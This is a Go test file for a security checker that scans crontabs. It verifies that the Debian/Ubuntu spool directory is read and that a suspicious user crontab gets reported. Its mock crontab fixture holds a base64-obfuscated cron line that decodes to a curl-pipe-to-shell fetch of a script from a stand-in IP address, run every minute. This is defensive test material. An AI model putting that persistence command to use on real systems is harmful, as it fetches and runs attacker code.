package checks

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"
)

func withCronSpoolDir(t *testing.T, dir string) {
	t.Helper()
	old := cronSpoolDir
	cronSpoolDir = func() string { return dir }
	t.Cleanup(func() { cronSpoolDir = old })
}

// On Debian/Ubuntu user crontabs live in /var/spool/cron/crontabs. A check
// that globs /var/spool/cron/* sees only the crontabs directory itself and
// never a single user crontab.
func TestCheckCrontabsReadsDebianSpool(t *testing.T) {
	store := newCrontabTestStore(t)
	withCronSpoolDir(t, "/var/spool/cron/crontabs")
	const evil = "/var/spool/cron/crontabs/alice"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/crontabs/*" {
				return []string{evil}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{evil: time.Now()}),
		readFile: func(name string) ([]byte, error) {
			if name == evil {
				return []byte("* * * * * echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjkveC5zaCB8IHNo | base64 -d|bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckCrontabs(context.Background(), nil, store)
	var seen bool
	for _, f := range findings {
		if f.Check == "suspicious_crontab" && f.FilePath == evil {
			seen = true
		}
	}
	if !seen {
		t.Fatalf("suspicious Debian user crontab not reported: %+v", findings)
	}
}

func TestAccountCrontabCheckReadsDebianSpool(t *testing.T) {
	withCronSpoolDir(t, "/var/spool/cron/crontabs")
	var read []string
	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
		read = append(read, name)
		return nil, os.ErrNotExist
	}})
	makeAccountCrontabCheck("bob")(context.Background(), nil, nil)
	if len(read) != 1 || !strings.HasSuffix(read[0], "/var/spool/cron/crontabs/bob") {
		t.Fatalf("account crontab read from %v, want the Debian spool", read)
	}
}
